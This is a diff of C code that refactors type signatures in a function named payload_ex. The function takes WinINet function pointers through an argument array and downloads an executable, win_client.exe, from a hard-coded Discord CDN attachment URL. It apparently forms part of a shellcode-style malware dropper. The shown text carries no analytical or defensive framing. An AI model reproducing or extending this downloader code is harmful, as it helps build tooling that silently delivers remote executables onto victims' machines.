@@ -19,11 +19,11 @@
 // extern int fwrite(unsigned char*, int, int, void*);
 
 #define NULL ((void *)0)
-typedef unsigned long long (*InterOpen)(unsigned short*, int, void*, void*,int);
-typedef unsigned long long (*InterOpenUrlA)(unsigned long long, char*, void*, int, int, int);
-typedef int (*InterReadFile)(unsigned long long, unsigned char*, int, int*);
+typedef void* (*InterOpen)(unsigned short*, int, void*, void*,int);
+typedef void* (*InterOpenUrlA)(void*, char*, void*, int, int, int);
+typedef int (*InterReadFile)(void*, unsigned char*, int, int*);
 typedef int (*fwrit)(unsigned char*, int, int, void*);
-typedef int (*InterCloseHandle)(unsigned long long);
+typedef int (*InterCloseHandle)(void*);
 typedef int (*GetLastRror)(void);
 typedef void(*finita)(void);
 
@@ -40,10 +40,10 @@ typedef void(*finita)(void);
 */
 
 
-void payload_ex(unsigned long long** args){
+void payload_ex(void** args){
     char url[] = "https://cdn.discordapp.com/attachments/762321594215038985/1166086220154146897/win_client.exe?ex=6549356b&is=6536c06b&hm=ab3edf49d3be8fd415240b11e1bf438494d8a0f8034b180c2d9f376bb94d6b71&";
     // char url[] = "http://ipv4.download.thinkbroadband.com/5MB.zip";
-    unsigned short junk[] = L"FileDownload";
+    unsigned short sFileDownload[] = L"FileDownload";
     InterOpen InternetOpen = args[0];
     InterOpenUrlA InternetOpenUrlA = args[1];
     InterReadFile InternetReadFile = args[2];
@@ -57,9 +57,10 @@ void payload_ex(unsigned long long** args){
     char buffer[16];
     int bytesRead = 0;
     int ptr = 0;
-    unsigned long long hInternet, hConnect;
+    int* hInternet;
+    int* hConnect;
     int failes = 100;
-    hInternet = InternetOpen(junk, 1, NULL, NULL, 0);
+    hInternet = InternetOpen(sFileDownload, 1, NULL, NULL, 0);
     if (hInternet == NULL) {
         return;
     }
